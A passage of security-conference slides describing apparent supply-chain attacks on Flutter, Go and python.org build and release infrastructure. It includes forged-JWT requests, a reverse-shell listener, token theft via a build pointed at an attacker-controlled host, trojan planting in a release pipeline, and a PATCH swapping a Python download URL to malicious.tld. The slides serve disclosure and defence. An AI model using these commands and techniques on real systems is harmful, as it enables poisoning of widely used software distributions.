  "contentType": "text/plain",
  "storageClass": "STANDARD",
  "size": "5",
```

## Slide 81

```text
https://www.googleapis.com/download/storage/v1/b/flutter_archives_v2/o/download.flutter.io%2Fio%2Fpwned.txt?alt

pwned

Write to gs://flutter_archives_v2

"storageClass": "STANDARD",
"size": "5",
```

## Slide 82

Pwned?

```text
pwned

Write to gs://flutter_archives_v2

"storageClass": "STANDARD",
"size": "5",
```

## Slide 83

```text
- name: Linux framework_tests_libraries

Install manually
Install with VS Code
SDK archive
Upgrade SDK
Add to path
Troubleshoot
Uninstall SDK
Resources

Install and set up Flutter

To install the Flutter SDK, download the latest stored.

1   Download the Flutter SDK bundle
Download the following installation bundle

flutter_windows_3.44.8-stable.zip

2   Create a folder to store the SDK

https://storage.googleapis.com/flutter_infra_release/releases/stable/windows/flutter_windows_3.44.8-stable.zip

t-aoxqd8Vjiq4fYs1O3RQ2UpWZ6vtY_sSqYfybq56JhzMjhxiRiI3u_mf6BWSrr91ytaY_1M4Z3Venzs5ffZcpghMvM653gj
bsnZ7M9Sl_Fp_Jnele_J_oVcsw2rn-499wcd9_YkitmY7mVXMQ7tlWMOBnt-F_wbch1FjSqUf1OFmxsJR7QM3k4ovl6aogJj
u1", "expiry": 1772716104}
```

## Slide 84

```text
- name: Linux framework_tests_libraries

Install manually
Install with VS Code
SDK archive
Upgrade SDK
Add to path
Troubleshoot
Uninstall SDK
Resources

Install and set up Flutter

To install the Flutter SDK, download the latest stored.

1   Download the Flutter SDK bundle
Download the following installation bundle

flutter_windows_3.44.8-stable.zip

gs://flutter_infra_release

2   Create a folder to store the SDK

https://storage.googleapis.com/flutter_infra_release/releases/stable/windows/flutter_windows_3.44.8-stable.zip

t-aoxqd8Vjiq4fYs1O3RQ2UpWZ6vtY_sSqYfybq56JhzMjhxiRiI3u_mf6BWSrr91ytaY_1M4Z3Venzs5ffZcpghMvM653gj
bsnZ7M9Sl_Fp_Jnele_J_oVcsw2rn-499wcd9_YkitmY7mVXMQ7tlWMOBnt-F_wbch1FjSqUf1OFmxsJR7QM3k4ovl6aogJj
u1", "expiry": 1772716104}
```

## Slide 85

Prod Task
Job#1
Job#2
Job#3
…

Cross Task

(Something Shared)

Try Task
Job#1
Job#2
Job#3
…

Local Auth RPC
Auth   Service Account
LUCI_CONTEXT
Based on task type

Bot
Job Worker

## Slide 86

Prod Task
Job#1
Job#2
Job#3
…

Cross Task

(Something Shared)

Try Task
Job#1
Job#2
Job#3
…

Local Auth RPC
Auth   Service Account
LUCI_CONTEXT
Based on task type

Bot
Job Worker

## Slide 87

Prod Task
Job#1
Job#2
Job#3
…

Cross Task

flutter_archives_v2

Try Task
Job#1
Job#2
Job#3
…

Local Auth RPC
Auth   Service Account
LUCI_CONTEXT
Based on task type

Bot
Job Worker

## Slide 88

Prod Task
Job#1
Job#2
Job#3
…

Cross Task

flutter_archives_v2

Try Task
Job#1
Job#2
Job#3
…

Local Auth RPC
Auth   Service Account
LUCI_CONTEXT
Based on task type

Bot
Job Worker

## Slide 89

mount_cache('builder')
_cache_path('builder')
gs://flutter_archives_v2/caches/builder-linux.json
hashes = {"builder": <digest>, "git": <digest>}
[CACHE]/builder   ← Flutter Engine
[CACHE]/git
git('checkout', '--force', pin or branch, '--', cwd=sln_dir)

Prod Task
Job#1
Job#2
Job#3
…

Cross Task

flutter_archives_v2

Try Task
Job#1
Job#2
Job#3
…

Local Auth RPC
Auth   Service Account
LUCI_CONTEXT
Based on task type

Bot
Job Worker

## Slide 90

mount_cache('builder')
_cache_path('builder')
gs://flutter_archives_v2/caches/builder-linux.json
hashes = {"builder": <digest>, "git": <digest>}
[CACHE]/builder   ← Flutter Engine
[CACHE]/git
git('checkout', '--force', pin or branch, '--', cwd=sln_dir)

Prod Task
Job#1
Job#2
Job#3
…

Cross Task

flutter_archives_v2

Try Task
Job#1
Job#2
Job#3
…

Local Auth RPC
Auth   Service Account
LUCI_CONTEXT
Based on task type

Bot
Job Worker

## Slide 91

mount_cache('builder')
_cache_path('builder')
gs://flutter_archives_v2/caches/builder-linux.json
hashes = {"builder": <digest>, "git": <digest>}
[CACHE]/builder   ← Flutter Engine
[CACHE]/git
git('checkout', '--force', pin or branch, '--', cwd=sln_dir)

Prod Task
Job#1
Job#2
Job#3
…

Cross Task

flutter_archives_v2

Try Task
Job#1
Job#2
Job#3
…

Local Auth RPC
Auth   Service Account
LUCI_CONTEXT
Based on task type

Bot
Job Worker

## Slide 92

mount_cache('builder')
_cache_path('builder')
gs://flutter_archives_v2/caches/builder-linux.json

Compromised!

[CACHE]/builder   ← Flutter Engine

git('checkout', '--force', pin or branch, '--', cwd=sln_dir)

Prod Task
Job#1
Job#2
Job#3
…

Cross Task

flutter_archives_v2

Try Task
Job#1
Job#2
Job#3
…

Local Auth RPC
Auth   Service Account
LUCI_CONTEXT
Based on task type

Bot
Job Worker

## Slide 93

**Cocoon Flutter Build Dashboard**

```text
Flutter Build Dashboard — Cocoon

Build
PreSubmit
Manual Tree Status
Framework Benchmarks
Engine Benchmarks
Source Code
About Flutter Build Dashboard — Cocoon

...c mac_unopt, Linux web_ca...   repo: flutter   branch: master

Cocoon
Flutter Build Dashboard
```

## Slide 94

if (email.endsWith( **'@google.com'** ) || await _isAllowedCached(token.email)) { return AuthenticatedContext(...); }

## Slide 95

Future<TokenInfo> decodeAndVerify(String jwtString) async { final now = _now(); **final jwt = await JsonWebToken.decodeAndVerify(jwtString, keyStore); verifyJwtClaims(jwt.claims, now);** return TokenInfo.fromJson(jwt.claims.toJson());

}

## Slide 96

Future<TokenInfo> decodeAndVerify(String jwtString) async { final now = _now(); **final jwt = await JsonWebToken.decodeAndVerify(jwtString, keyStore); verifyJwtClaims(jwt.claims, now);** return TokenInfo.fromJson(jwt.claims.toJson());

}

## Slide 97

```text
_reports curl -s -H "X-Flutter-IdToken: " "https://flutter-dashboard.appspot.com/api/get-tree-status?repo=flutter" -i
HTTP/2 401
date: Tue, 17 Mar 2026 16:46:51 GMT
content-type: text/plain; charset=utf-8
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block
x-content-type-options: nosniff
via: 1.1 google
alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

User is not signed in
```

## Slide 98

```text
_reports curl -s -H "X-Flutter-IdToken: " "https://flutter-dashboard.appspot.com/api/get-tree-status?repo=flutter" -i
HTTP/2 401
date: Tue, 17 Mar 2026 16:46:51 GMT
content-type: text/plain; charset=utf-8
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block
x-content-type-options: nosniff
via: 1.1 google
alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

User is not signed in

_reports curl -s -H "X-Flutter-IdToken: $(python forge_cocoon_jwt.py)" "https://flutter-dashboard.appspot.com/api/get-

[{"createdOn":"2026-02-09T20:54:51.478050Z","status":"success","author":"codefu@google.com","reason":"Github looks normal
"2026-02-09T19:03:48.170224Z","status":"failure","author":"codefu@google.com","reason":"GitHub Actions Failing"},{"created
697Z","status":"success","author":"codefu@google.com","reason":"GitHub normal"},{"createdOn":"2026-02-09T16:35:28.308656Z"
:"codefu@google.com","reason":"GitHub outage"},{"createdOn":"2026-02-03T00:44:54.958181Z","status":"success","author":"jtm
ooks like actions are running again"},{"createdOn":"2026-02-02T22:32:13.848204Z","status":"failure","author":"codefu@googl
ons Outage"},{"createdOn":"2025-11-26T22:48:54.819921Z","status":"success","author":"loicsharma@google.com","reason":"LSC
hub.com/flutter/flutter/issues/178827"},{"createdOn":"2025-11-25T16:06:10.011102Z","status":"failure","author":"katelovett
ng for LSC - lints https://github.com/flutter/flutter/issues/178827"},{"createdOn":"2025-07-07T19:27:05.346994Z","status":
oogle.com","reason":"format has concluded "},{"createdOn":"2025-07-07T15:11:39.745121Z","status":"failure","author":"matan
duled Dart format 3.8"}]

_reports
```

## Slide 99

```text
rlwrap ncat -lvp 7414

uid=1000(chrome-bot) gid=1000(chrome-bot) groups=1000(chrome-bot),109(kvm)
TOKEN=$(luci-auth token -scopes https://www.googleapis.com/auth/cloud-platform)
for B in flutter_infra_release download.flutter.io flutter_archives_v2; do
  echo "$B: $(curl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/s
ge.objects.create" | grep -o 'storage.objects.create')"
done
flutter_infra_release: storage.objects.create
download.flutter.io: storage.objects.create
flutter_archives_v2: storage.objects.create
```

## Slide 100

```text
rlwrap ncat -lvp 7414

uid=1000(chrome-bot) gid=1000(chrome-bot) groups=1000(chrome-bot),109(kvm)
TOKEN=$(luci-auth token -scopes https://www.googleapis.com/auth/cloud-platform)
for B in flutter_infra_release download.flutter.io flutter_archives_v2; do
  echo "$B: $(curl -s -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/s
ge.objects.create" | grep -o 'storage.objects.create')"
done
flutter_infra_release: storage.objects.create
download.flutter.io: storage.objects.create
flutter_archives_v2: storage.objects.create
```

Full Compromised!

## Slide 101

Flutter Hacked 2

## Slide 102

Golang 3

## Slide 103

```text
https://gomote.golang.org

Gomote Server

Instances

Name
drchase-gotip-linux-am
drchase-gotip-linux-am

https://build.golang.org

Go Build Coordinator     Build Dashboard   Performance Dashboard   Builders

master   show only first-class ports

Go
                                             darwin
        amd64   amd64   amd64   amd64   amd64   arm64   arm64   arm64   arm64   arm64 | 386
         13-     14-     15-   longtest  nocgo-    13-     14-     15-     26-  longtest | clang15
6db72bb  jorro...  25 Jul 13:25  cmd/compile: remove...        ok ok ok ok fail ok ok ok ok ok | ok
af4b02c  jorro...  25 Jul 13:24  cmd/compile: do not ...       ok ok ok ok fail ok ok ok ok ok | ok
7b4aab8  sam...    25 Jul 03:27  internal/strconv: rem...      ok ok ok ok fail ok ok ok ok ok | ok
a961f70  hya...    24 Jul 21:36  cmd/go/internal/doc: ...      ok ok ok ok fail ok ok ok ok ok | ok
a3b0982  ado...    24 Jul 21:26  cmd/vet: update Test...       ok ok ok ok fail ok ok ok ok ok | ok
f0dbb9b  ado...    24 Jul 18:48  cmd: update x/tools t...      ok ok ok ok ok  ok ok ok ok ok | ok
```

## Slide 104

Redirect to Login ... Not in IAM list → 403

**IAP** Identity-Aware Proxy Pass Inject X-Goog-IAP-JWT-Assertion header

**gomote.golang.org build.golang.org**

## Slide 105

```text
<header>.{
  "iss":      "https://cloud.google.com/iap",
  "aud":      "/projects/<proj-id>/global/backendServices/<svc-id>",
  "sub":      "accounts.google.com:<account-id>",
  "email":    "someone@google.com",
  "hd":       "google.com",
  "iat":      1145141919,
  "exp":      1145149453,
  "google":   { "access_levels": [...] }
}.<signature>
```

## Slide 106

```go
IAPSkipAudienceValidation = ""

RequireIAPAuthUnaryInterceptor(IAPSkipAudienceValidation)

func (v *Validator) validate(ctx, idToken, audience) (*Payload, err) {
    if audience != "" && payload.Audience != audience {
        return nil, fmt.Errorf("idtoken: audience does not match")
```

## Slide 107

```go
IAPSkipAudienceValidation = ""

RequireIAPAuthUnaryInterceptor(IAPSkipAudienceValidation)
```

**Always Pass!**

```go
func (v *Validator) validate(ctx, idToken, audience) (*Payload, err) {
    if audience != "" && payload.Audience != audience {
        return nil, fmt.Errorf("idtoken: audience does not match")
```

## Slide 108

```text
go / build / 8cc3517581090ba52a473fc0602e02169929d921
commit 8cc3517581090ba52a473fc0602e02169929d921 [log] [tgz]
author Carlos Amedee <carlos@golang.org>
committer Carlos Amedee <carlos@golang.org>
Fri Jan 14 10
Sat Jan 15 00
tree 84a37675b293c344e243c08300cc322682f8792d
parent 09d18253d412a5a6c4177d5056a968953fe6269e [diff]
internal/access, cmd/coordinator: add option to
disable audience check
This change adds the option to skip the validation of the audience
field in JWT tokens. We understand that validating the JWT token is
enough to know that the packet came from a valid source.
Updates golang/go#48742
```

## Slide 109

```text
go / build / 8cc3517581090ba52a473fc0602e02169929d921
commit 8cc3517581090ba52a473fc0602e02169929d921 [log] [tgz]
author Carlos Amedee <carlos@golang.org> Fri Jan 14 10
committer Carlos Amedee <carlos@golang.org> Sat Jan 15 00
tree 84a37675b293c344e243c08300cc322682f8792d
parent 09d18253d412a5a6c4177d5056a968953fe6269e [diff]
internal/access, cmd/coordinator: add option to disable audience check
This change adds the option to skip the validation of the audience
field in JWT tokens. We understand that validating the JWT token is
enough to know that the packet came from a valid source.
Updates golang/go#48742
```

## Slide 110

```text
cmd/coordinator/coordinator.go                                    +2 -2

@@ -346,8 +346,8 @@ func main() {
346  346          if serviceID = env.IAPServiceID(coordinatorBackend); serviceID == "" {
347  347              log.Fatalf("unable to retrieve Service ID for backend service=%q", coordinatorBackend)
348  348          }
349      -       opts = append(opts, grpc.UnaryInterceptor(access.RequireIAPAuthUnaryInterceptor(access.IAPAudienceGCE(env.ProjectNumber, serviceID))))
350      -       opts = append(opts, grpc.StreamInterceptor(access.RequireIAPAuthStreamInterceptor(access.IAPAudienceGCE(env.ProjectNumber, serviceID))))
     349  +       opts = append(opts, grpc.UnaryInterceptor(access.RequireIAPAuthUnaryInterceptor(access.IAPSkipAudienceValidation)))
     350  +       opts = append(opts, grpc.StreamInterceptor(access.RequireIAPAuthStreamInterceptor(access.IAPSkipAudienceValidation)))
351  351      }
352  352      // grpcServer is a shared gRPC server. It is global, as it needs to be used in places that aren't factored otherwise.
353  353      grpcServer := grpc.NewServer(opts...)
```

## Slide 111

```text
- RequireIAPAuthUnaryInterceptor(access.IAPAudienceGCE(env.ProjectNumber, serviceID))
+ RequireIAPAuthUnaryInterceptor(access.IAPSkipAudienceValidation)
```

```text
cmd/coordinator/coordinator.go                                    +2 -2

@@ -346,8 +346,8 @@ func main() {
346  346          if serviceID = env.IAPServiceID(coordinatorBackend); serviceID == "" {
347  347              log.Fatalf("unable to retrieve Service ID for backend service=%q", coordinatorBackend)
348  348          }
349      -       opts = append(opts, grpc.UnaryInterceptor(access.RequireIAPAuthUnaryInterceptor(access.IAPAudienceGCE(env.ProjectNumber, serviceID))))
350      -       opts = append(opts, grpc.StreamInterceptor(access.RequireIAPAuthStreamInterceptor(access.IAPAudienceGCE(env.ProjectNumber, serviceID))))
     349  +       opts = append(opts, grpc.UnaryInterceptor(access.RequireIAPAuthUnaryInterceptor(access.IAPSkipAudienceValidation)))
     350  +       opts = append(opts, grpc.StreamInterceptor(access.RequireIAPAuthStreamInterceptor(access.IAPSkipAudienceValidation)))
351  351      }
352  352      // grpcServer is a shared gRPC server. It is global, as it needs to be used in places that aren't factored otherwise.
353  353      grpcServer := grpc.NewServer(opts...)
```

## Slide 112

```text
Go Build Coordinator     Build Dashboard   Performance Das

Defined Builders

name                        pool                                    owners
aix-ppc64                   host-aix-ppc64-osuosl                   @trex58
android-386-emu              host-linux-amd64-androidemu             golang-dev
android-amd64-emu            host-linux-amd64-androidemu             golang-dev
android-arm-corellium         host-android-arm64-corellium-android    @steeve, @changkun
android-arm64-corellium       host-android-arm64-corellium-android    @steeve, @changkun
darwin-amd64-10_15            host-darwin-amd64-10_15-aws             golang-dev
darwin-amd64-11_0             host-darwin-amd64-11-aws                golang-dev
darwin-amd64-12_0             host-darwin-amd64-12-aws                golang-dev
darwin-amd64-13               host-darwin-amd64-13-aws                golang-dev
darwin-amd64-longtest         host-darwin-amd64-13-aws                golang-dev
darwin-amd64-nocgo            host-darwin-amd64-12-aws                golang-dev
darwin-amd64-race             host-darwin-amd64-12-aws                golang-dev
darwin-arm64-11               host-darwin-arm64-11                    golang-dev
darwin-arm64-12               host-darwin-arm64-12                    golang-dev
dragonfly-amd64-622           host-dragonfly-amd64-622                golang-dev
freebsd-386-12_3              host-freebsd-amd64-12_3                 golang-dev
freebsd-386-13_0              host-freebsd-amd64-13_0                 golang-dev
freebsd-amd64-12_3            host-freebsd-amd64-12_3                 golang-dev
freebsd-amd64-13_0            host-freebsd-amd64-13_0                 golang-dev
freebsd-amd64-race            host-freebsd-amd64-13_0                 golang-dev
freebsd-arm-paulzhol          host-freebsd-arm-paulzhol               @paulzhol
freebsd-arm64-dmgk            host-freebsd-arm64-dmgk                 @dmgk
freebsd-riscv64-unmatched     host-freebsd-riscv64-unmatched          @mengzhuo
illumos-amd64                 host-illumos-amd64-jclulow               @jclulow
```

## Slide 113

```text
splitline@splitlinedeMacBook-Pro:~/golang-cicd-sec/poc/poc

poc IAP_JWT=$(/Users/splitline/golang-cicd-sec/make_iap_jwt.sh \
  --cid 'a8ebf94c8-01ff-457a-aed4-4add00d5f328' \
  --app-url 'https://serene-smoke-244105.uc.r.appspot.com/' \
  --sa 'iap-tester@serene-smoke-244105.iam.gserviceaccount.com' \
  --project 'serene-smoke-244105' \
  2>/dev/null)

echo "${IAP_JWT:0:120}..."

eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InVvWZyJ9.eyJhdWQiOiIvcHJvamVjdHMvMzE4OTA0NjM1L2FwcHMvc2VydW5lLXNtb2t2t...

poc go run . -target gomotessh.golang.org:443 -jwt "$IAP_JWT" create go1.25-linux-amd64
[*] Waiting (0 ahead)...
[+] Created iap-tester-go1.25-linux-amd64-0  (builder=go1.25-linux-amd64, host=swarming task)
poc go run . -target gomotessh.golang.org:443 -jwt "$IAP_JWT" -sys exec iap-tester-go1.25-linux-amd64-0 -- bash -c "id; uname -a"
uid=1000(swarming) gid=1000(swarming) groups=1000(swarming)
Linux golang-ciw-n1-linux-x86-bullseye-us-central1-b-0-vvxv 6.1.161+ #1 SMP PREEMPT_DYNAMIC Sat Feb  7 20:26:32 UTC 2026 x86_64 GNU/Li
```

## Slide 114

Job#1
Job#2
Local Auth RPC
Job#3
… Auth Service Account
Job#1
Prod Task
LUCI_CONTEXT
Job#2
Based on Task Type
Job#3
…
Bot
Job Worker
Try Task

## Slide 115

Job#1
Job#2
Local Auth RPC
Job#3
Security Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on Task Type
Job#3
…
Public Task
Try Bot
chromium-swarm.appspot.com

## Slide 116

Job#1
Job#2
Local Auth RPC
security-try-workers
Job#3
Security Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on Task Type
Job#3
ci-workers
… try-workers
Public Task
Try Bot
chromium-swarm.appspot.com

## Slide 117

Job#1
Job#2
Local Auth RPC
security-try-workers
Job#3
Security Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on Task Type
Job#3
ci-workers
… try-workers
Public Task
Try Bot
chromium-swarm.appspot.com

## Slide 118

Job#1
Job#2
Local Auth RPC
security-try-workers
Job#3
Security Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on Task Type
Job#3
ci-workers
… try-workers
Public Task
Try Bot
chromium-swarm.appspot.com
Cross Bot?

## Slide 119

Job#1
Job#2
Local Auth RPC
Job#3
Security Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on Task Type
Job#3
ServiceAccount: "coordinator-builder@golang-ci-luci…"
…
CipdPackage:    "infra/tools/luci-auth/…"
Public Task
Try Bot
chromium-swarm.appspot.com

## Slide 120

Job#1
Job#2
Job#3
…
Se

Local Auth RPC
Auth
Service Account
LUCI_CONTEXT
Based on Task Type

luci.binding(
    roles = "role/buildbucket.triggerer",
    users = ["coordinator-builder@…", "security-coordinator-builder@…"],
)

Trigger Arbitrary Job!

Job#2
Job#3

ServiceAccount: "coordinator-builder@golang-ci-luci…"
CipdPackage:    "infra/tools/luci-auth/…"

Public Task
Try Bot
chromium-swarm.appspot.com

## Slide 121

curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \ -H "Authorization: Bearer $COORDINATOR_TOKEN" \

--json '{ "builder": { "project": "golang", "bucket": "try", "builder": "go1.25-linux-amd64" }, "gerritChanges": [{

"host": "go-review.googlesource.com", "project": "go", "change": "114514", "patchset": "1" }] }'

## Slide 122

curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \ -H "Authorization: Bearer $COORDINATOR_TOKEN" \

--json '{ "builder": { "project": "golang", "bucket": "security-try", "builder": "go1.25-linux-amd64" },

"gerritChanges": [{

"host": "splitline.tw",

"project": "go", "change": "114514", "patchset": "1" }]

}'

## Slide 123

curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \ -H "Authorization: Bearer $COORDINATOR_TOKEN" \ --json '{ "builder": { "project": "golang", "bucket": "security-try", "builder": "go1.25-linux-amd64" }, "gerritChanges": [{ "host": "splitline.tw", "project": "go", "change": "114514", "patchset": "1" }] }'

```text
ncat -klvp 1337

Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 34.82.20.82:55177.
GET /a/changes/go~99999 HTTP/1.1
Host: splitline.tw
Accept-Encoding: gzip
Authorization: Bearer ya29.c.c0AZ4bNpZMFNTfxF0kIADxm9
User-Agent: Go-http-client/2.0
```

## Slide 124

curl "cr-buildbucket.appspot.com/prpc/buildbucket.v2.Builds/ScheduleBuild" \ -H "Authorization: Bearer $COORDINATOR_TOKEN" \ --json '{ "builder": { "project": "golang", "bucket": "security-try", "builder": "go1.25-linux-amd64" }, "gerritChanges": [{ "host": "splitline.tw", "project": "go", "change": "114514", "patchset": "1" }] }'

```text
ncat -klvp 1337

Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 34.82.20.82:55177.
GET /a/changes/go~99999 HTTP/1.1
Host: splitline.tw
Accept-Encoding: gzip
Authorization: Bearer ya29.c.c0AZ4bNpZMFNTfxF0kIADxm9
User-Agent: Go-http-client/2.0
```

```text
~ curl -s "https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=$STOLEN_TOKEN" 2>&1
{
  "azp": "116567426346993112035",
  "aud": "116567426346993112035",
  "scope": "https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/gerritps://www.googleapis.com/auth/cloud-platform",
  "exp": "1771430176",
  "expires_in": "3398",
  "email": "security-coordinator-builder@golang-ci-luci.iam.gserviceaccount.com",
  "email_verified": "true",
  "access_type": "online"
}
```

## Slide 125

Job#1
Job#2
Local Auth RPC
security-worker-builder@
Job#3
Security Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on Task Type
Job#3
…
Public Task
Try Bot
chromium-swarm.appspot.com

## Slide 126

Job#1
gs://golang/
Job#2
Local Auth RPC
security-worker-builder@
Job#3
Security Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on Task Type
Job#3
…
Public Task
Try Bot
chromium-swarm.appspot.com

## Slide 127

Job#1
gs://golang/
Job#2
Local Auth RPC
security-worker-builder@
Job#3
Security Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on Task Type
Job#3
…
Public Task
Try Bot
chromium-swarm.appspot.com

## Slide 128

Job#1
gs://golang/
Job#2
Local Auth RPC
security-worker-builder@
Job#3
Security Bot
… chrome-swarming.appspot.com Auth Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on Task Type
Job#3
…
RELUI
Public Task
Try Bot REL ease UI
chromium-swarm.appspot.com

## Slide 129

Job#1
gs://golang/
Job#2
Local Auth RPC
security-worker-builder@
Job#3
Release
Security Bot
… chrome-swarming.appspot.com Auth Pipeline Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
Based on relui-prod@ Task Type
Job#3
…
RELUI
Public Task
Try Bot REL ease UI
chromium-swarm.appspot.com

## Slide 130

Job#1
gs://golang/
Job#2
Local Auth RPC
security-worker-builder@
Job#3
Release
Security Bot
… chrome-swarming.appspot.com Auth Pipeline Service Account
Job#1
Security Task
Security Patch LUCI_CONTEXT
Job#2
relui-task@ Based on relui-prod@ Task Type
Job#3
…
RELUI
Public Task
Try Bot REL ease UI
chromium-swarm.appspot.com

## Slide 131

```text
x/build/internal/gomote: explore destroying the bot after a gomote
instance is destroyed #63819
Open   Listed in #61772
cagedmantis opened on Oct 30, 2023          Last edited by cagedmantis   Contributor
When a gomote instance runs on a swarming task instead of a bare VM/Container, we should consider destroying the bot after the
gomote instance has completed running. This should be an added safeguard for unwanted artifacts being left behind on the instance.
@golang/release
```

**Bot Reusing!**

## Slide 132

Job#1 Job#2 Job#3 …

RELUI REL ease UI

Security Task Security Patch Security Bot chrome-swarming.appspot.com

## Slide 133

**Our#1** Job#2 RELUI Job#3 REL ease UI … security-worker-builder@ Security Task Security Patch Security Bot chrome-swarming.appspot.com

## Slide 134

Plant Trojan!
RELUI
REL ease UI

Our#1
Job#2
Job#3
…
security-worker-builder@
Security Task
Security Patch Security Bot
chrome-swarming.appspot.com

## Slide 135

(do evil things) Job#1 **Job#2** RELUI Job#3 REL ease UI … security-worker-builder@ Security Task Security Patch Security Bot chrome-swarming.appspot.com

## Slide 136

Got You RELUI!

Job#1 **Job#2** Job#3 … relui-task@ **relui-task@** Security Task Security Patch Security Bot chrome-swarming.appspot.com

RELUI
REL ease UI

## Slide 137

Got You RELUI! **relui-task@** Job#1 **Job#2** RELUI Job#3 REL ease UI … **relui-task@** Security Task Security Patch Security Bot chrome-swarming.appspot.com

Who Are You?

## Slide 138

### Releasing Pipeline

dl.google.com/go gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot**

## Slide 139

### Releasing Pipeline

dl.google.com/go gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot** relui-task@

## Slide 140

### Releasing Pipeline

dl.google.com/go gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot** relui-task@ [ gs://golang-release-staging ]

## Slide 141

### Releasing Pipeline

dl.google.com/go gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot** relui-task@ [ gs://golang-release-staging ]

## Slide 142

### Releasing Pipeline

dl.google.com/go gs://golang/ **Cloud Build Gerrit Compare Sign Upload Source Code Windows bot** relui-task@ [ gs://golang-release-staging ]

## Slide 143

### Releasing Pipeline

dl.google.com/go gs://golang/ **Gerrit Cloud Build**

[ gs://golang-release-staging ]

**Compromised!**

## Slide 144

Python 4

## Slide 145

how to install python

## Slide 146

```text
how to install python

AI Mode   All   Videos   Short videos   Images   Forums   News   More   Tools

AI Overview

To install Python, go to the Official Python Downloads Page for your OS, download the
latest stable version, and run the installer. Crucial: Ensure you check the box that says
"Add python.exe to PATH" (or "Add Python to environment variables") before clicking "Install
Now."
```

## Slide 147

```text
how to install python

AI Mode   All   Videos   Short videos   Images   Forums   News   More   Tools

AI Overview

To install Python, go to the Official Python Downloads Page for your OS, download the
latest stable version, and run the installer. Crucial: Ensure you check the box that says
"Add python.exe to PATH" (or "Add Python to environment variables") before clicking "Install
Now."
```

## Slide 148

```text
https://www.python.org/downloads/

Python   PSF   Docs   PyPI   Jobs

Python

Donate

About Downloads Documentation Community Success Stories News Events
Download the latest version for macOS
Download Python 3.14.6
Looking for Python with a different OS? Python for Windows,
Linux/Unix, macOS, Android, iOS, other
Want to help test development versions of Python 3.15? Pre-releases,
Docker images
```

## Slide 149

```text
https://www.python.org/downloads/

Python   PSF   Docs   PyPI   Jobs

Python

Donate

About Downloads Documentation Community Success Stories News Events
Download the latest version for macOS
Download Python 3.14.6
Looking for Python with a different OS? Python for Windows,
Linux/Unix, macOS, Android, iOS, other
Want to help test development versions of Python 3.15? Pre-releases,
Docker images
```

## Slide 150

```text
https://www.python.org/downloads/

Python   PSF   Docs   PyPI   Jobs

Python

Donate

About Downloads Documentation Community Success Stories News Events
Download the latest version for macOS
Download Python 3.14.6
Looking for Python with a different OS? Python for Windows,
Linux/Unix, macOS, Android, iOS, other
Want to help test development versions of Python 3.15? Pre-releases,
Docker images
```

WHAT?

## Slide 151

```text
https://www.python.org/downloads/

Python   PSF   Docs   PyPI   Jobs

Python

Donate

About Downloads Documentation Community Success Stories News Events
Download the latest version for macOS
Download Python 3.14.6
Looking for Python with a different OS? Python for Windows,
Linux/Unix, macOS, Android, iOS, other
Want to help test development versions of Python 3.15? Pre-releases,
Docker images
```

WHAT?

## Slide 152

PATCH /api/v1/downloads/release_file/123/ ?format=json&username=ambv&api_key=ANY HTTP/1.1 Host: www.python.org Content-Type: application/json

{"url": "https://malicious.tld/python.exe"}

## Slide 153

PATCH /api/v1/downloads/release_file/123/ ?format=json&username=ambv&api_key=ANY HTTP/1.1 Host: www.python.org Content-Type: application/json

{"url": "https://malicious.tld/python.exe"}

```text
macOS

Download Mac OS X 64-bit/32-bit installer

Version
Gzipped source tarball
XZ compressed source tarball
Mac OS X 32-bit i386/PPC installer
Mac OS X 64-bit/32-bit installer

www.python.org/ftp/python/3.3.5/python-3.3.5-macosx10.6.dmg#pwned
```

## Slide 154

PATCH /api/v1/downloads/release_file/123/ ?format=json&username=ambv&api_key=ANY HTTP/1.1 Host: www.python.org Content-Type: application/json

{"url": "https://malicious.tld/python.exe"}

```text
macOS

Download Mac OS X 64-bit/32-bit installer

Mac OS X 64-bit/32-bit installer

www.python.org/ftp/python/3.3.5/python-3.3.5-macosx10.6.dmg#pwned
```

**Compromised!**

## Slide 155

```text
Code   Issues 65   Pull requests 44   Agents   Actions   Projects   Security and quality   Insights

pythondotorg  Public     Sponsor   Watch 123   Fork 686   Star 1.6k

main    Go to file    +    Code

JacobCoffee  update ack ui (#3066)   d99979b · 14 hours ago

.github    chore(deps): bump zizmorcore...    5 days ago

About
Source code for python.org
www.python.org
psf  python
Readme
```

